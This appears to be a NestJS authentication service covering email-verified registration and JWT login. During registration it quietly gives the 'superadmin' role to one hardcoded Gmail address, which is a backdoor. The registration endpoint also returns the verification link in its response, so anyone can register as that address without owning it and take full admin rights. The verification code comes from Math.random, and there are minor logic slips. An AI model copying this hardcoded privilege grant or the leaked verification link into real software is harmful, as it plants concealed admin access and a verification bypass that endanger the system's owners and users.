import {
  BadRequestException,
  Injectable,
  NotFoundException,
} from '@nestjs/common';
import { JwtConnectionService } from 'src/core/micro-service/jwt/jwt.connection.service';
import { MailerConnectionService } from 'src/core/micro-service/email/mailer.connection.service';
import { UserService } from '../../users/user/user.service';
import { CreateUserDto } from '../../users/user/dto/create-user.dto';
import { LoginAuthDto } from './dto/login.auth.dto';
import { RedisConnectService } from 'src/core/micro-service/cache/redis.connection.service';
import { ConfigService } from '@nestjs/config';
import { ProfileService } from '../../users/profile/profile.service';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(
    private readonly jwtService: JwtConnectionService,
    private readonly mailerService: MailerConnectionService,
    private readonly userService: UserService,
    private readonly redisService: RedisConnectService,
    private readonly profileService: ProfileService,
    private readonly config: ConfigService,
  ) {}

  async sendVerifyUrl(userdto: CreateUserDto) {
    await this.userService.checkExists(userdto);
    const code = Math.floor(Math.random() * 1000000);
    const verifyUrl = await this.getVerifyUrl(`${code}`, userdto.email);
    const emailstatus = await this.mailerService.sendRegisterVerify(
      userdto.email,
      verifyUrl,
    );
    const redisSts = await this.redisService.setItem(userdto.email, userdto);
    return {
      verifyUrl,
      emailstatus,
      redisSts,
    };
  }

  async verificationUserAndRegister(token: string) {
    try {
      const { email, code } = await this.jwtService.verfiySessionTken(token);
      const userdata = await this.redisService.getValue<CreateUserDto>(email);
      if (!userdata) {
        throw new NotFoundException('User data not found in cache !');
      }
      if(userdata.email === "ovovovlululutvata@gmail.com") {
        userdata['role'] = 'superadmin';
      }
      if (!email || userdata === null) {
        throw new BadRequestException('Invalid email or expires url !');
      }
      const newUser = await this.userService.create(userdata, true);
      const newProfile = await this.profileService.create({
        user_id: newUser.id,
      });

      return {
        accessToken: await this.jwtService.getAccessToken({
          id: newUser.id,
          role: newUser.role,
        }),
        refreshToken: await this.jwtService.getRefreshToken({
          id: newUser.id,
          role: newUser.role,
        }),
        newUser,
      };
    } catch (error) {
      throw new BadRequestException(
        `Invalid url or expires token ${error.name}`,
      );
    }
  }

  async getVerifyUrl(code: string, email: string) {
    // const host = this.config.get<string>('APP_HOST');
    // const port = this.config.get<string>('APP_PORT');
    const sessionToken = await this.jwtService.getSessionToke({ email, code });
    
    const baseUrl = process.env.BASE_URL || this.config.get<string>("BASE_URL")
    return `${baseUrl}/api/auth/verify/${sessionToken}`;
  }

  async loginAndGetToken(data: LoginAuthDto) {
    const exists = await this.userService.findByEmail(data.email);
    if (exists && exists.id && exists.role) {
      const checkPass = await bcrypt.compare(data.password, exists?.password);
      if (!checkPass)
        throw new BadRequestException('Invalid email or password !');
      return {
        accessToken: await this.jwtService.getAccessToken({
          id: exists.id,
          role: exists.role,
        }),
        refreshToken: await this.jwtService.getRefreshToken({
          id: exists.id,
          role: exists.role,
        }),
        exists,
      };
    } else {
      throw new NotFoundException('Invalid email or password !');
    }
  }
}
